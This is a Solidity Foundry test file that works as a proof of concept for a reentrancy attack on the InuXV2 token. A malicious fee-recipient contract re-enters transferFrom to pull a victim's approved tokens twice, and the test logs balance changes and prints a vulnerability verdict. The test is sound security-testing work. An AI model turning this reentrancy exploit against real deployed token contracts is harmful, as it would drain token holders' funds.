// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/InuXV2.sol";

contract MaliciousMarketingWallet {
    InuXV2 public token;
    address public victim;
    address public recipient;
    bool public isReentering;
    uint256 public attackAmount;

    constructor(address _token, address _victim, address _recipient, uint256 _attackAmount) {
        token = InuXV2(payable(_token));
        victim = _victim;
        recipient = _recipient;
        attackAmount = _attackAmount;
    }

    function startAttack() external {
        token.transferFrom(victim, recipient, attackAmount);
    }

    receive() external payable {
        if (!isReentering) {
            isReentering = true;
            token.transferFrom(victim, recipient, attackAmount);
            isReentering = false;
        }
    }
}

contract InuXV2ReentrancyTest is Test {
    InuXV2 public token;
    MaliciousMarketingWallet public maliciousWallet;
    
    address payable public owner = payable(address(0x1));
    address public victim = address(0x2);
    address public beneficiary = address(0x3);
    
    uint256 public constant INITIAL_SUPPLY = 1_000_000_000 * 1e9;
    uint256 public constant ATTACK_AMOUNT = 100_000 * 1e9;
    uint256 public constant FEE_PERCENT = 10;
    
    address constant ROUTER_ADDRESS = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant WETH_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.startPrank(owner);
        // Deploy mock router
        vm.etch(ROUTER_ADDRESS, new bytes(0x1));
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(bytes4(keccak256("factory()"))),
            abi.encode(address(0))
        );
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(bytes4(keccak256("WETH()"))),
            abi.encode(WETH_ADDRESS)
        );
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(bytes4(keccak256("addLiquidityETH(address,uint256,uint256,uint256,address,uint256)"))),
            abi.encode(0, 0, 0)
        );
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(bytes4(keccak256("swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)"))),
            abi.encode()
        );
        
        address mockFactory = address(0x1234);
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(bytes4(keccak256("factory()"))),
            abi.encode(mockFactory)
        );
        vm.mockCall(
            mockFactory,
            abi.encodeWithSelector(bytes4(keccak256("createPair(address,address)"))),
            abi.encode(address(0x123))
        );

        token = new InuXV2();
        
        // Configure settings with safe parameters
        token.setSwapSettings(
            true, 
            10_000 * 1e9, // swapThreshold 
            50_000_000 * 1e9 // maxSwapAmount 
        );
        
        // Set fees to reasonable levels
        token.setBuyFees(
            FEE_PERCENT * 100, // reflectionsFee
            FEE_PERCENT * 100, // liquidityFee
            FEE_PERCENT * 100, // marketingFee
            FEE_PERCENT * 100, // teamFee
            100_000 // feeDenominator (adjusted to prevent overflow)
        );

        // Send initial tokens to victim
        token.transfer(victim, ATTACK_AMOUNT * 10);
        
        // Create malicious wallet acting as team/marketing wallet
        maliciousWallet = new MaliciousMarketingWallet(
            address(token),
            victim,
            beneficiary,
            ATTACK_AMOUNT
        );
        
        // Set malicious wallet as fee recipient
        token.changeMarketingWallet(payable(address(maliciousWallet)));
        token.changeTeamWallet(payable(address(maliciousWallet)));
        vm.stopPrank();

        // Set approval for transfers
        vm.prank(victim);
        token.approve(address(maliciousWallet), ATTACK_AMOUNT * 3);

        // Fund token contract to simulate WETH swap
        vm.deal(address(token), 10 ether);
    }

    function testReentrantAttack() public {
        // Simulate fee accumulation by transferring between accounts
        address feePayer = address(0x6);
        vm.prank(victim);
        token.transfer(feePayer, ATTACK_AMOUNT * 5);
        
        // Capture state BEFORE attack
        console2.log("--- BEFORE-Trigger Reentrancy Attack ---");
        uint contractBefore = token.balanceOf(address(token));
        uint victimBefore = token.balanceOf(victim);
        uint beneficiaryBefore = token.balanceOf(beneficiary);
        
        console2.log("Victim Balance Before Attack:    ", victimBefore);
        console2.log("Beneficiary Balance Before Attack:", beneficiaryBefore);
        console2.log("Contract Balance Before Attack:   ", contractBefore);

        // Trigger attack
        console2.log("\n--- Trigger Attack Operation ---");
        maliciousWallet.startAttack();
        
        // Capture state AFTER attack
        console2.log("\n--- AFTER-Trigger Reentrancy Attack ---");
        uint victimAfter = token.balanceOf(victim);
        uint beneficiaryAfter = token.balanceOf(beneficiary);
        uint contractAfter = token.balanceOf(address(token));
        
        console2.log("Victim Balance After Attack:    ", victimAfter);
        console2.log("Beneficiary Balance After Attack:", beneficiaryAfter);
        console2.log("Contract Balance After Attack:   ", contractAfter);
        
        // Critical balance changes
        uint victimLoss = victimBefore - victimAfter;
        uint beneficiaryGain = beneficiaryAfter - beneficiaryBefore;
        uint256 minAttackEvidence = (ATTACK_AMOUNT * 15) / 10; // 1.5x threshold
        
        // Vulnerability analysis
        console2.log("\n--- Differential Analysis ---");
        console2.log("Victim Actual Loss:          ", victimLoss);
        console2.log("Beneficiary Actual Gain:     ", beneficiaryGain);
        console2.log("Minimum Evidence Threshold:  ", minAttackEvidence);
        
        // Vulnerability verdict logic
        console2.log("\n--- Vulnerability Verdict ---");
        if (victimLoss >= minAttackEvidence || beneficiaryGain >= minAttackEvidence) {
            console2.log("Vulnerability Exists: Reentrancy caused abnormal balance changes");
        } else {
            console2.log("Vulnerability not Exist: Balance changes within expected limits");
        }
        
        // Final vulnerability decision (one line output)
        if (victimLoss >= minAttackEvidence || beneficiaryGain >= minAttackEvidence) {
            console2.log("Vulnerability Exists: Balance changes beyond expected limits");
        } else {
            console2.log("Vulnerability not Exist: Balance changes within expected limits");
        }
    }
}